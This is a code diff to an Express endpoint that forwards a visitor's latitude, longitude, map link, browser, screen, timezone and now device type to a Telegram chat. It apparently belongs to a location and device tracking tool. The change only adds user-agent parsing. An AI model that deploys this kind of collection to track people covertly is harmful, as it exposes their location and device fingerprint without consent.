@@ -73,6 +73,26 @@ app.post("/send-to-telegram", async (req, res) => {
       latitude, longitude, mapLink
     } = req.body;
 
+function detectDevice(userAgent) {
+  const ua = userAgent.toLowerCase();
+
+  // Detect OS/platform
+  let platform = "Unknown";
+  if (/android/.test(ua)) platform = "Android";
+  else if (/iphone|ipad|ipod/.test(ua)) platform = "iOS";
+  else if (/windows phone/.test(ua)) platform = "Windows Phone";
+  else if (/windows/.test(ua)) platform = "Windows";
+  else if (/macintosh|mac os x/.test(ua)) platform = "Mac OS";
+  else if (/linux/.test(ua)) platform = "Linux";
+
+  // Detect device type
+  let deviceType = "Desktop";
+  if (/mobile/.test(ua)) deviceType = "Smartphone";
+  else if (/tablet|ipad/.test(ua)) deviceType = "Tablet";
+
+  return { platform, deviceType };
+}
+
     function getFriendlyPlatform(userAgent, platform) {
   const ua = userAgent.toLowerCase();
 
@@ -87,13 +107,14 @@ app.post("/send-to-telegram", async (req, res) => {
   return platform || "Unknown";
 }
 
-    const friendlyPlatform = getFriendlyPlatform(userAgent, platform);
+    const { platform: friendlyPlatform, deviceType } = detectDevice(userAgent);
 
 const message = `
 📋 *Device Info:*
 🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
 🌐 *Browser:* ${escapeMarkdownV2(browserName)}
 🖥️ *Platform:* ${escapeMarkdownV2(friendlyPlatform)}
+📱 *Device Type:* ${escapeMarkdownV2(deviceType)}
 🗣️ *Language:* ${escapeMarkdownV2(language)}
 ⏰ *Timezone:* ${escapeMarkdownV2(timezone)}
 🖥️ *Screen:* ${escapeMarkdownV2(screenWidth + "x" + screenHeight)}
